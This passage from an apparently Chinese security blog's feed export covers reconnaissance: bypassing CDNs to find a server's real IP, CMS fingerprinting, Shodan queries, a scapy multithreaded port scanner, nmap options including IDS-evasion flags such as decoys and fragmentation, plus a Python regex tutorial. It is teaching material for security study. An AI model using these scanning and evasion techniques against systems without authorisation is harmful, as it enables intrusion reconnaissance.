rel="noopener">http://www.ip138.com</a></li><li>如果有CDN，需要绕过获取真实IP地址<ol><li>内部邮箱源，收集到内部邮箱服务器IP地址</li><li>网站phpinfo.php文件</li><li>分站IP地址，查询子域名，CDN很贵，可能分站没有使用CDN</li><li>国外服务器进行ping <a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a></li><li>查询域名解析记录 <a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a></li></ol></li></ul><h2 id="05-CMS识别"><a href="#05-CMS识别" class="headerlink" title="05 CMS识别"></a>05 CMS识别</h2><ol><li><p>CMS介绍</p><p>各种CMS具有独特的结构命名规则和特定的文件内容，因此可以利用这些内容来获取CMS站点的具体软件CMS与版本<br>常见CMS：dedecms（织梦）、Discuz、phpcms</p></li><li><p>CMS识别工具</p><ul><li>在线工具 </li></ul><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a> </p><p><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></p><ul><li>本地工具</li></ul><p>What web,御剑web指纹识别程序，大禹CMS识别程序</p></li></ol><h2 id="06-敏感目录信息探测"><a href="#06-敏感目录信息探测" class="headerlink" title="06 敏感目录信息探测"></a>06 敏感目录信息探测</h2><p>探测工具：御剑后台扫描工具、wwwscan命令行工具、dirb命令行工具、dirbuster扫描工具、Dirmap、Nikto</p><h2 id="07-Shodan"><a href="#07-Shodan" class="headerlink" title="07 Shodan"></a>07 Shodan</h2><p><a href="https://www.shodan.io" target="_blank" rel="noopener">Shodan</a>不是在网上搜索网址，而是直接进入互联网的背后通道，寻找和互联网关联的服务器、摄像头、打印机、路由器等等，需要注册</p><ol><li>网页搜索<ul><li>在explore搜索框中输入webcam进行搜索使</li><li>用port关键字 如:port:22</li><li>使用关键字host 如:host:61.135.169.121</li><li>使用关键字city 如:city:hangzhou port:22</li></ul></li><li>命令行搜索<ul><li>安装命令行 pip install shodan</li><li>初始化 shodan init api</li><li>常用搜索：<ul><li>查询apache服务器的数量 shodan count apache </li><li>查询使用服务的主机信息 shodan search Microsoft iis 6.0 </li><li>获取指定IP地址信息 shodan host ip</li><li>获取当前帐号信息 shodan info</li><li>获取自身外部IP地址 shodan myip</li><li>检测是否有蜜罐 shodan honeyscore ip</li></ul></li></ul></li><li>使用shodan API编写python脚本进行查询</li></ol><pre><code class="hljs python"><span class="hljs-keyword">import</span> shodan<span class="hljs-keyword">import</span> sysAPI_KEY=<span class="hljs-string">"your key"</span><span class="hljs-keyword">if</span> len(sys.argv)==<span class="hljs-number">1</span>:  print(<span class="hljs-string">"Usage:%s &lt;search query&gt;"</span>%sys.argv[<span class="hljs-number">0</span>])    sys.exit[<span class="hljs-number">1</span>]  <span class="hljs-keyword">try</span>:    api=shodan.Shodan(API_KEY)    query=<span class="hljs-string">' '</span>.join(sys.argv[<span class="hljs-number">1</span>:])    result=api.search[query]        <span class="hljs-keyword">for</span> service <span class="hljs-keyword">in</span> result[<span class="hljs-string">'matches'</span>]:        print(service[<span class="hljs-string">'ip_str'</span>])<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:    print(<span class="hljs-string">"Error:%s"</span>%e)    sys.exit(<span class="hljs-number">1</span>)</code></pre>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python编写端口扫描器</title>
    <link href="/Python%E7%BC%96%E5%86%99%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    <url>/Python%E7%BC%96%E5%86%99%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>使用scapy编写的扫描器，可以进行tcp与udp扫描</p><a id="more"></a><p>以命令行方式启动，多线程扫描</p><p>可以同时进行ICMP、ACK、SYN、FIN、UDP多种扫描</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> timescreenLock=Semaphore(value=<span class="hljs-number">1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">icmp_scan</span><span class="hljs-params">(ip)</span>:</span>    reply=sr1(IP(dst=ip)/ICMP(),timeout=<span class="hljs-number">5</span>)    <span class="hljs-keyword">if</span> reply:        <span class="hljs-keyword">if</span> reply[ICMP].type==<span class="hljs-number">0</span>:            print(<span class="hljs-string">'%s IMCP reply'</span>%ip)    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">'%s NO IMCP reply'</span>%ip)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">syn_scan</span><span class="hljs-params">(ip,port)</span>:</span>    screenLock.acquire()    reply=sr1(IP(dst=ip)/TCP(sport=RandShort(),dport=port,flags=<span class="hljs-string">'S'</span>),timeout=<span class="hljs-number">5</span>)    <span class="hljs-keyword">if</span> (reply <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>):        print(<span class="hljs-string">'%s : %s Filtered'</span>%(ip,port))    <span class="hljs-keyword">elif</span>(reply.haslayer(TCP)):        <span class="hljs-keyword">if</span>(reply.getlayer(TCP).flags==<span class="hljs-string">'SA'</span>):            print(<span class="hljs-string">'%s : %s Open'</span>%(ip,port))        <span class="hljs-keyword">elif</span>(reply.getlayer(TCP).flags==<span class="hljs-string">'RA'</span>):            print(<span class="hljs-string">'%s : %s Closed'</span> % (ip, port))    <span class="hljs-keyword">elif</span> (reply.haslayer(ICMP)):        <span class="hljs-keyword">if</span> (int(reply.getlayer(ICMP).type) == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> int(reply.getlayer(ICMP).code) <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>]):            print(<span class="hljs-string">'%s : %s Filtered'</span> % (ip, port))    screenLock.release()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ack_scan</span><span class="hljs-params">(ip,port)</span>:</span>    screenLock.acquire()    reply = sr1(IP(dst=ip) / TCP(sport=RandShort(), dport=port, flags=<span class="hljs-string">'A'</span>), timeout=<span class="hljs-number">5</span>)    <span class="hljs-keyword">if</span> (reply <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>):        print(<span class="hljs-string">'%s : %s Filtered'</span> % (ip, port))    <span class="hljs-keyword">elif</span> (reply.haslayer(TCP)):        <span class="hljs-keyword">if</span> (reply.getlayer(TCP).flags == <span class="hljs-string">'R'</span>):            print(<span class="hljs-string">'%s : %s Unfiltered'</span> % (ip, port))    <span class="hljs-keyword">elif</span>(reply.haslayer(ICMP)):        <span class="hljs-keyword">if</span>(int(reply.getlayer(ICMP).type)==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> int(reply.getlayer(ICMP).code) <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>]):            print(<span class="hljs-string">'%s : %s Filtered'</span> % (ip, port))    screenLock.release()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fin_scan</span><span class="hljs-params">(ip,port)</span>:</span>    screenLock.acquire()    reply = sr1(IP(dst=ip) / TCP(sport=RandShort(), dport=port, flags=<span class="hljs-string">'F'</span>),timeout=<span class="hljs-number">5</span>)    <span class="hljs-keyword">if</span> (reply <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>):        print(<span class="hljs-string">'%s : %s Open or Filtered'</span> % (ip, port))    <span class="hljs-keyword">elif</span> (reply.haslayer(TCP)):        <span class="hljs-keyword">if</span> (reply.getlayer(TCP).flags == <span class="hljs-string">'RA'</span>):            print(<span class="hljs-string">'%s : %s Closed'</span> % (ip, port))    <span class="hljs-keyword">elif</span>(reply.haslayer(ICMP)):        <span class="hljs-keyword">if</span>(int(reply.getlayer(ICMP).type)==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> int(reply.getlayer(ICMP).code) <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>]):            print(<span class="hljs-string">'%s : %s Filtered'</span> % (ip, port))    screenLock.release()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">udp_scan</span><span class="hljs-params">(ip,port)</span>:</span>    screenLock.acquire()    reply=sr1(IP(dst=ip) / UDP(dport=port),timeout=<span class="hljs-number">10</span>)    <span class="hljs-keyword">if</span>(str(type(reply)==<span class="hljs-string">''</span>)):        print(<span class="hljs-string">'%s : %s Open or Filtered'</span> % (ip, port))    <span class="hljs-keyword">elif</span>(reply.haslayer(UDP)):        print(<span class="hljs-string">'%s : %s Open'</span> % (ip, port))    <span class="hljs-keyword">elif</span> (reply.haslayer(ICMP)):        <span class="hljs-keyword">if</span> (int(reply.getlayer(ICMP).type) == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> int(reply.getlayer(ICMP).code)==<span class="hljs-number">3</span>):            print(<span class="hljs-string">'%s : %s Closed'</span> % (ip, port))        <span class="hljs-keyword">elif</span> (int(reply.getlayer(ICMP).type) == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> int(reply.getlayer(ICMP).code) <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>]):            print(<span class="hljs-string">'%s : %s Filtered'</span> % (ip, port))    screenLock.release()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">banner</span><span class="hljs-params">()</span>:</span>    print(<span class="hljs-string">'''</span><span class="hljs-string">    -----------------------</span><span class="hljs-string">          My Scanner</span><span class="hljs-string">    -----------------------</span><span class="hljs-string">    -p/--port 指定端口</span><span class="hljs-string">    未指定时扫描常用服务端口</span><span class="hljs-string">    </span><span class="hljs-string">    可同时使用多种技术进行扫描</span><span class="hljs-string">    --icmp</span><span class="hljs-string">    --syn/--ack/--fin</span><span class="hljs-string">    --udp</span><span class="hljs-string">    </span><span class="hljs-string">    -h/--help 获取帮助</span><span class="hljs-string">    -----------------------</span><span class="hljs-string">    '''</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>    parser=argparse.ArgumentParser(description=banner())    <span class="hljs-comment"># 设置扫描ip地址和端口</span>    parser.add_argument(<span class="hljs-string">'ip'</span>,help=<span class="hljs-string">'设置目标IP'</span>)    parser.add_argument(<span class="hljs-string">'-p'</span>,<span class="hljs-string">'--port'</span>,dest=<span class="hljs-string">'port'</span>,action=<span class="hljs-string">'store'</span>,help=<span class="hljs-string">'设置目标端口,如80 80,81 80-90'</span>)    <span class="hljs-comment">#设置扫描类型</span>    parser.add_argument(<span class="hljs-string">'--icmp'</span>, dest=<span class="hljs-string">'icmp'</span>, default=<span class="hljs-number">0</span>, action=<span class="hljs-string">'store_true'</span>, help=<span class="hljs-string">'进行ICMP扫描'</span>)    parser.add_argument(<span class="hljs-string">'--syn'</span>, dest=<span class="hljs-string">'syn'</span>, default=<span class="hljs-number">0</span>, action=<span class="hljs-string">'store_true'</span>, help=<span class="hljs-string">'进行SYN扫描'</span>)    parser.add_argument(<span class="hljs-string">'--ack'</span>, dest=<span class="hljs-string">'ack'</span>, default=<span class="hljs-number">0</span>, action=<span class="hljs-string">'store_true'</span>, help=<span class="hljs-string">'进行ACK扫描'</span>)    parser.add_argument(<span class="hljs-string">'--fin'</span>, dest=<span class="hljs-string">'fin'</span>, default=<span class="hljs-number">0</span>, action=<span class="hljs-string">'store_true'</span>, help=<span class="hljs-string">'进行FIN扫描'</span>)    parser.add_argument(<span class="hljs-string">'--udp'</span>, dest=<span class="hljs-string">'udp'</span>, default=<span class="hljs-number">0</span>, action=<span class="hljs-string">'store_true'</span>, help=<span class="hljs-string">'进行UDP扫描'</span>)    args = parser.parse_args()    <span class="hljs-comment">#用正则表达式匹配输入的端口</span>    <span class="hljs-comment">#分别为指定单个端口，指定范围，用逗号分隔多个端口</span>    type1=<span class="hljs-string">r'\d&#123;1,5&#125;$'</span>                       <span class="hljs-comment"># -p 80</span>    type2=<span class="hljs-string">r'\d&#123;1,5&#125;-\d&#123;1,5&#125;$'</span>               <span class="hljs-comment"># -p 80-90</span>    type3=<span class="hljs-string">r'\d&#123;1,5&#125;(,\d&#123;1,5&#125;)+'</span>             <span class="hljs-comment"># -p 80,801</span>    port_list = list()    <span class="hljs-keyword">if</span> args.port:        <span class="hljs-keyword">if</span> re.match(type1,args.port):            port_list.append(args.port)        <span class="hljs-keyword">elif</span> re.match(type2,args.port):            temp_list=args.port.split(<span class="hljs-string">'-'</span>)            l=int(temp_list[<span class="hljs-number">0</span>])            r=int(temp_list[<span class="hljs-number">1</span>])            <span class="hljs-keyword">if</span> l&gt;r:                l,r=r,l            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> range(l,r+<span class="hljs-number">1</span>):                port_list.append(int(p))        <span class="hljs-keyword">elif</span> re.match(type3,args.port):            temp_list=args.port.split(<span class="hljs-string">','</span>)            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> temp_list:                port_list.append(p)    <span class="hljs-keyword">else</span>:        <span class="hljs-comment">#未指定端口时默认扫描的端口列表</span>        port_list=[<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">25</span>,<span class="hljs-number">53</span>,<span class="hljs-number">80</span>,<span class="hljs-number">110</span>,<span class="hljs-number">443</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">8080</span>]    threads_ack=[]    threads_syn = []    threads_fin = []    threads_udp = []    start_time = time.time()    print(<span class="hljs-string">'------ 开始扫描... ... ------'</span>)    <span class="hljs-keyword">if</span> args.icmp:        print(<span class="hljs-string">'---------- ICMP扫描 ----------'</span>)        icmp_scan(args.ip)        print(<span class="hljs-string">'----------------------------'</span>)    <span class="hljs-keyword">if</span> args.syn:        print(<span class="hljs-string">'---------- SYN扫描 ----------'</span>)        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> port_list:            t=Thread(target=syn_scan,args=(args.ip,int(port)))            threads_syn.append(t)        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_syn:            t.start()        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_syn:            t.join()        print(<span class="hljs-string">'----------------------------'</span>)    <span class="hljs-keyword">if</span> args.ack:        print(<span class="hljs-string">'---------- ACK扫描 ----------'</span>)        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> port_list:            t = Thread(target=ack_scan, args=(args.ip, int(port)))            threads_ack.append(t)        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_ack:            t.start()        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_ack:            t.join()        print(<span class="hljs-string">'----------------------------'</span>)    <span class="hljs-keyword">if</span> args.fin:        print(<span class="hljs-string">'---------- FIN扫描 ----------'</span>)        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> port_list:            t = Thread(target=fin_scan, args=(args.ip, int(port)))            threads_fin.append(t)        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_fin:            t.start()        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_fin:            t.join()        print(<span class="hljs-string">'----------------------------'</span>)    <span class="hljs-keyword">if</span> args.udp:        print(<span class="hljs-string">'---------- UDP扫描 ----------'</span>)        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> port_list:            t = Thread(target=udp_scan, args=(args.ip, int(port)))            threads_udp.append(t)        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_udp:            t.start()        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_udp:            t.join()        print(<span class="hljs-string">'----------------------------'</span>)    end_time = time.time()    print(<span class="hljs-string">'--------- 扫描已完成！---------'</span>)    print(<span class="hljs-string">'--------- 用时：%s s---------'</span>%(end_time-start_time))<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:    main()</code></pre>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>python</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集方法总结</title>
    <link href="/nmap%E5%B8%B8%E7%94%A8%E6%89%AB%E6%8F%8F%E5%91%BD%E4%BB%A4/"/>
    <url>/nmap%E5%B8%B8%E7%94%A8%E6%89%AB%E6%8F%8F%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>本文总结了常用nmap常用的命令</p><a id="more"></a><h1 id="nmap常用扫描命令"><a href="#nmap常用扫描命令" class="headerlink" title="nmap常用扫描命令"></a>nmap常用扫描命令</h1><ol><li><p>只指定目标地址 nmap 192.168.0.1<br>将扫描目标主机是否开启，开放的端口及服务，目标MAC地址</p><p>可以使用多种方法指定目标主机，如：</p><ul><li>单个主机 192.168.0.1</li><li>网段 192.168.0.0/24</li><li>十进制的IP区间 192.168.0-2.1</li><li>多个目标 192.168.0.1, 172.168.3-5,9.1</li><li>标准格式的IPv6地址和主机名方式命名的IPv6主机地址</li><li>从文件中读取 -iL filename</li></ul></li><li><p>常用选项</p><ul><li>服务版本识别 -sV</li><li>操作系统检测 -O</li><li>脚本扫描 -sC</li><li>禁用主机检测 -Pn<br>nmap不检测主机是否开机，直接进行扫描</li><li>强力扫描 -A，包括 -sV -O –sC –traceroute</li><li>–traceroute</li></ul></li><li><p>TCP扫描</p><ul><li>TCP连接扫描 -sT<br>会进行完整的三次握手，速度较慢，可能会被发现，权限不足时，默认情况下将使用这种方法进行扫描</li><li>SYN扫描 -sS<br>又称半开扫描，不进行完整的三次握手，速度快，有高级别权限时，默认情况下将使用这种方法进行扫描<br>若回应的标志位为SYN、ACK，则端口开放<br>若回应的标志位为RST，则端口关闭</li><li>NULL扫描 -sN<br>不设置任何控制位<br>若目标主机无回应，则端口开放<br>若回应的标志位为RST，则端口关闭<br>若返回 ICMP 错误类型3且代码为1，2，3，9，10或13的数据包，则说明端口被服务器过滤了</li><li>FIN扫描 -sF<br>设置FIN标志位<br>若回应的标志位为RST，则端口关闭<br>若返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 状态码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定是否处于开放状态</li><li>XMAS扫描 -sX<br>设置FIN、PSH、URG标志位<br>若目标主机无回应，则端口开放或被过滤<br>若回应的标志位为RST，则端口关闭<br>若返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 状态码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定是否处于开放状态</li><li>ACK扫描 -sA，只能判断端口是否被过滤<br>设置ACK标志位<br>若回应的标志位为RST，则端口没有被过滤<br>若没有任何回应或者返回ICMP 错误类型3且代码为1，2，3，9，10或13的数据包，则说明端口被过滤且存在状态防火墙</li><li>窗口扫描 -sW<br>设置ACK标志位，会检查窗口大小的值<br>若回应的标志位为RST且窗口大小非零，则端口开放<br>若回应的标志位为RST且窗口大小为零，则端口关闭</li><li>Maimon扫描 -sM<br>设置FIN/ACK标志位<br>若数据包被丢弃，则端口开放<br>若回应的标志位为RST，则端口关闭</li><li>Idle扫描 -sI<br>使用僵尸主机进行扫描</li></ul></li><li><p>UDP扫描 -sU</p><p>不如TCP扫描可靠，且速度较慢<br>可以指定常用端口，使用并发扫描，绕过防火墙，设置超时来提高速度</p></li><li><p>输出选项</p><ul><li>交互（屏幕输出）<br>默认输出方式</li><li>正常输出 -oN<br>与默认类似，但是不显示runtime信息和警告信息</li><li>输出XML文件 -oX filename<br>导出XML文件</li><li>生成Grep文件 -oG</li></ul><p>使用-oA选项可以同时正常输出、输出为XML文件和Grep文件</p></li><li><p>时间选项 -T0~T5</p><p>一般不需要进行设置</p></li><li><p>脚本引擎<br>共有12个分类<br>auth,default,discovery,dos,exploit,external,fuzzer,instrusive,malware,safe,version,vuln<br>使用-sC或–script指定脚本<br>使用–script-args &lt;args&gt;传递参数</p></li><li><p>规避检测的选项</p><ul><li>使用小数据包 -f</li><li>设置数据包大小 –mtu 必须是8的倍数</li><li>改变数据包数据长度 –data-length</li><li>诱饵IP -D 掺杂一些假的源IP，可能造成网络拥堵</li><li>模拟源端口 –source-port</li><li>设置最大连接数 –max-parallelism</li><li>设置时间间隔 –scan-delay</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 正则表达式</title>
    <link href="/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>本文总结了正则表达式的语法和Python中re模块的使用</p><a id="more"></a><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="01-字符含义"><a href="#01-字符含义" class="headerlink" title="01 字符含义"></a>01 字符含义</h2><ol><li><p>普通字符和11个元字符<br><img src="/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/1.png" srcset="/img/loading.gif" alt><br>python中默认采用的是贪婪匹配，会输出最长的子串，添加？可以变成非贪婪匹配，输出最短子串</p><pre><code class="hljs python">a = re.match(<span class="hljs-string">'&lt;(.*)&gt;'</span>,<span class="hljs-string">'&lt;11&gt;&lt;22&gt;&lt;33&gt;'</span>).group()print(a)b = re.match(<span class="hljs-string">'&lt;(.*?)&gt;'</span>,<span class="hljs-string">'&lt;11&gt;&lt;22&gt;&lt;33&gt;'</span>).group()print(b)c=re.match(<span class="hljs-string">'A.*C'</span>,<span class="hljs-string">'AbCbbbCbbbC'</span>).group()print(c)d=re.match(<span class="hljs-string">'A.*?C'</span>,<span class="hljs-string">'AbCbbbCbbbC'</span>).group()print(d)<span class="hljs-string">'''</span><span class="hljs-string">&lt;11&gt;&lt;22&gt;&lt;33&gt;</span><span class="hljs-string">&lt;11&gt;</span><span class="hljs-string">AbCbbbCbbbC</span><span class="hljs-string">AbC</span><span class="hljs-string">'''</span></code></pre></li></ol><ol start="2"><li><p>预定义字符集（可以写在字符集[…]中）<br><img src="/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/2.png" srcset="/img/loading.gif" alt></p></li><li><p>特殊分组用法<br><img src="/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/4.png" srcset="/img/loading.gif" alt></p></li><li><p>常用表达式</p><p>IPv4地址：^((25[0-5]|2[0-4]\d|[01]?\d\d?).){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$</p><p>IPv6地址：^([\da-fA-F]{1,4}:){7}[\da-fA-F]{1,4}$</p></li></ol><h2 id="02-re常用函数"><a href="#02-re常用函数" class="headerlink" title="02 re常用函数"></a>02 re常用函数</h2><ol><li><p><strong>compile(pattern,flags=0)</strong><br>编译正则表达式模式，返回一个对象的模式。（可以把常用的正则表达式编译成正则表达式对象，提高效率）</p><p>pattern: 编译时用的表达式字符串。</p><p>flags 编译标志位，用于修改正则表达式的匹配方式，如：是否区分大小写，多行匹配等。常用的flags有：<br><img src="/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/3.png" srcset="/img/loading.gif" alt></p></li><li><p><strong>match(pattern, string,flags=0)</strong><br>尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，就返回None<br><strong>span表示只返回结果中的span元组，表示起始位置和结束位置，从0开始计数</strong></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-comment"># match用于匹配字符串是否在开头的位置</span>print(re.match(<span class="hljs-string">'www'</span>,<span class="hljs-string">'www.baidu.com'</span>).span())  <span class="hljs-comment"># 只返回位置元组信息</span>print(re.match(<span class="hljs-string">'www$'</span>,<span class="hljs-string">'www.baidu.com'</span>))  <span class="hljs-comment"># $表示完全匹配</span>print(re.match(<span class="hljs-string">'baidu'</span>,<span class="hljs-string">'www.baidu.com'</span>))  <span class="hljs-comment">#不在起始位置，返回None</span><span class="hljs-string">'''</span><span class="hljs-string">(0, 3)</span><span class="hljs-string">None</span><span class="hljs-string">None</span><span class="hljs-string">'''</span></code></pre></li><li><p><strong>search(pattern, string,flags=0)</strong><br>re.search函数会在整个字符串内查找模式匹配,只要找到第一个匹配然后返回，如果字符串没有匹配，则返回None。</p><pre><code class="hljs python">print(re.match(<span class="hljs-string">'baidu'</span>,<span class="hljs-string">'www.baidu.com'</span>))print(re.search(<span class="hljs-string">'baidu'</span>,<span class="hljs-string">'www.baidu.com'</span>).span())print(re.search(<span class="hljs-string">'bili+'</span>,<span class="hljs-string">'www.bilibili.com'</span>))<span class="hljs-string">'''</span><span class="hljs-string">None</span><span class="hljs-string">(4, 9)</span><span class="hljs-string">&lt;re.Match object; span=(4, 8), match='bili'&gt;</span><span class="hljs-string">'''</span></code></pre><p><strong>注：match和search一旦匹配成功，就是一个match object对象，而match object对象有以下方法：</strong></p><ul><li>group() 返回被 RE 匹配的字符串</li><li>start() 返回匹配开始的位置</li><li>end() 返回匹配结束的位置</li><li>span() 返回一个元组包含匹配 (开始,结束) 的位置</li><li>group() 返回re整体匹配的字符串，可以一次输入多个组号，对应组号匹配的字符串</li></ul></li><li><p><strong>findall(pattern, string.flags=0)</strong><br>可以获取字符串中所有匹配的字符串，返回一个列表</p><pre><code class="hljs python">print(re.search(<span class="hljs-string">'\w*oo\w*'</span>,<span class="hljs-string">'cool,good,wow'</span>))print(re.findall(<span class="hljs-string">'\w*oo\w*'</span>,<span class="hljs-string">'cool,good,wow'</span>))<span class="hljs-string">'''</span><span class="hljs-string">&lt;re.Match object; span=(0, 4), match='cool'&gt;</span><span class="hljs-string">['cool', 'good']</span><span class="hljs-string">'''</span></code></pre></li><li><p><strong>finditer(pattern, string, flags=0)</strong><br>搜索string，返回一个顺序访问每一个匹配结果（Match对象）的迭代器。找到 RE 匹配的所有子串，并把它们作为一个迭代器返回。</p><pre><code class="hljs python">iter=re.finditer(<span class="hljs-string">'\d+'</span>,<span class="hljs-string">'10,9,8,7...'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> iter:    print(i)    print(i.group())    print(i.span())    <span class="hljs-string">'''</span><span class="hljs-string">&lt;re.Match object; span=(0, 2), match='10'&gt;</span><span class="hljs-string">10</span><span class="hljs-string">(0, 2)</span><span class="hljs-string">&lt;re.Match object; span=(3, 4), match='9'&gt;</span><span class="hljs-string">9</span><span class="hljs-string">(3, 4)</span><span class="hljs-string">&lt;re.Match object; span=(5, 6), match='8'&gt;</span><span class="hljs-string">8</span><span class="hljs-string">(5, 6)</span><span class="hljs-string">&lt;re.Match object; span=(7, 8), match='7'&gt;</span><span class="hljs-string">7</span><span class="hljs-string">(7, 8)</span><span class="hljs-string">'''</span></code></pre></li><li><p><strong>split(pattern, string[, maxsplit])</strong></p><p>按照能够匹配的子串将string分割后返回列表。</p><p>可以使用re.split来分割字符串，如：re.split(r’\s+’, text)；将字符串按空格分割成一个单词列表。<br>maxsplit用于指定最大分割次数，不指定将全部分割。</p><pre><code class="hljs python">print(re.split(<span class="hljs-string">'\s'</span>,<span class="hljs-string">'hello my friend!'</span>))<span class="hljs-comment">#['hello', 'my', 'friend!']</span></code></pre></li><li><p><strong>sub(pattern, repl, string, count)</strong><br>使用repl替换string中每一个匹配的子串后返回替换后的字符串。</p><p>count表示最大替换个数，默认为0 ，每个匹配项都替换</p><pre><code class="hljs python">print(re.sub(<span class="hljs-string">'\d'</span>,<span class="hljs-string">'0'</span>,<span class="hljs-string">'123456789'</span>))print(re.sub(<span class="hljs-string">'\d'</span>,<span class="hljs-string">'0'</span>,<span class="hljs-string">'123456789'</span>,<span class="hljs-number">3</span>))<span class="hljs-string">'''</span><span class="hljs-string">000000000</span><span class="hljs-string">000456789</span><span class="hljs-string">'''</span></code></pre><p><strong>subn(pattern, repl, string, count=0, flags=0)</strong><br>返回替换后字符串和替换次数的元组</p> <pre><code class="hljs python"> print(re.sub(<span class="hljs-string">'\d'</span>,<span class="hljs-string">'0'</span>,<span class="hljs-string">'123456789'</span>))    print(re.subn(<span class="hljs-string">'\d'</span>,<span class="hljs-string">'0'</span>,<span class="hljs-string">'123456789'</span>))<span class="hljs-string">'''</span><span class="hljs-string">000000000</span><span class="hljs-string">('000000000', 9)</span><span class="hljs-string">'''</span></code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python中的RSA、DES、HASH加密</title>
